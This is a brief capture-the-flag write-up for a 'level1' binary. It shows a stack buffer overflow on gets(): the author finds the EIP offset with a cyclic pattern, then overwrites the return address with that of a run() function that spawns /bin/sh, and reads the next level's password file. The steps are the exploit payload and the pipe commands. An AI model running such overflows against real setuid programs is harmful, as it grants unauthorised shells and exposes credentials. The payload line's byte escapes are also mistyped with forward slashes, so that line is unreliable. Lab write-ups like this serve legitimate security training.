We can see a binary named ./level1 with the level2 rights

After a "disas main" in gdb we can see there's a gets.
After a "info function" we can see another function next to main, called run

If we disas run we can see that run opperate a system("/bin/sh")
We can verify it if we break in main, and write "call run()"
It will open a sh, but unfortunately we havnt the EUID rights due to GDB...

Let's proceed a bufferoverflow and put a jump to run, at the EIP address

We can use this website to generate and calculate our bufferoverflow

https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

Lets generate a 100char buffer to check where EIP is located.

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

put the code in a file and pipe it in the program, started with GDB.

It returns 0x63413563, the value of eip when it segfault
With the website, we put it and it will return the lenght of the bufferoverflow

The lenght is 76

Se now we must create a 76B string and add it the realtive address of run() in order
to override the value of the saved EIP.

To get the relative address of run() you must get the address of run() by 
"info functions run"
The address of run is : 0x08048444

Reversed : 0x44840408

python : 
("\x90" * 76) + "/x44/x84/x04/x08"

put the result in a file and use the result of cat to pipe level1

python exploit > pad

cat /tmp/pad - | ./level1

dont forget the " - " for the bash access

Now you are can "cd .." then "cd ./level2" and "cat .pass"


